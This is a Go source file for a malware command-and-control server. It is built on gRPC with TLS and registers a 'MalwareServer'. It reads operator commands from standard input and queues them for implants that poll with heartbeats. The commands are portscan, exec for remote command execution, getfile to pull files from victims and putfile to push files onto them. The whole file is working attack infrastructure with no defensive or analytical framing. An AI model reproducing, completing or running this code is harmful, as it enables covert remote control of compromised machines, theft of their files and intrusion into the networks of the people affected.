package main

import (
	"bufio"
	"context"
	"fmt"
	"google.golang.org/grpc/credentials"
	"io/ioutil"
	"malware/common"
	pb "malware/common/messages"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"google.golang.org/grpc"
)

type c2 struct {
	port  int
	queue chan *pb.CheckCmdReply
}

func (c2 *c2) handleReply(reply *pb.ImplantReply) {
	fmt.Println("Reply", reply)
}

func (c2 *c2) CheckCommandQueue(_ context.Context, req *pb.CheckCmdRequest) (*pb.CheckCmdReply, error) {
	switch u := req.Message.(type) {
	case *pb.CheckCmdRequest_Heartbeat:
		select {
		case x, ok := <-c2.queue:
			fmt.Println(x)
			if ok {
				return x, nil
			} else {
				common.Panic("QUeue closed")
			}
		default:
		}
	case *pb.CheckCmdRequest_Reply:
		c2.handleReply(u.Reply)
	default:
		common.Panic("Didn't receive a valid message", req, u)
	}
	return &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Heartbeat{Heartbeat: time.Now().Unix()}}, nil
}

func (c2 *c2) ReadUserInput() {
	reader := bufio.NewReader(os.Stdin)
	for {
		text, _ := reader.ReadString('\n')
		parts := strings.Split(strings.TrimSpace(text), " ")
		switch parts[0] {
		case "portscan":
			start, _ := strconv.Atoi(parts[2])
			end, _ := strconv.Atoi(parts[3])
			message := &pb.PortScan{Ip: parts[1], StartPort: int32(start), EndPort: int32(end)}
			c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Portscan{Portscan: message}}
		case "exec":
			message := &pb.Exec{Exec: parts[1], Args: parts[2:]}
			c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Exec{Exec: message}}
		case "getfile":
			message := &pb.GetFile{Filename: parts[1]}
			c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Getfile{Getfile: message}}
		case "putfile":
			out, err := ioutil.ReadFile(parts[2])
			if err != nil {
				common.Panicf(err, "Erroring loading file")
			}
			message := &pb.UploadFile{Filename: parts[1], Contents: out}
			c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Uploadfile{Uploadfile: message}}
		default:
			fmt.Println(parts[0])
		}

	}

}

func main() {
	// TODO: Replace with %PORT%
	// TODO: Replacewith %certfile% %keyfile%
	creds, _ := credentials.NewServerTLSFromFile("MyCertificate.crt", "MyKey.key")
	c2 := &c2{port: 8000, queue: make(chan *pb.CheckCmdReply, 100)}
	host := fmt.Sprintf(":%d", c2.port)
	listener, err := net.Listen("tcp", host)

	if err != nil {
		common.Panicf(err, "Hosting on %s failed", host)
	}

	defer listener.Close()

	server := grpc.NewServer(grpc.Creds(creds))

	pb.RegisterMalwareServer(server, c2)
	go c2.ReadUserInput()
	server.Serve(listener)

}
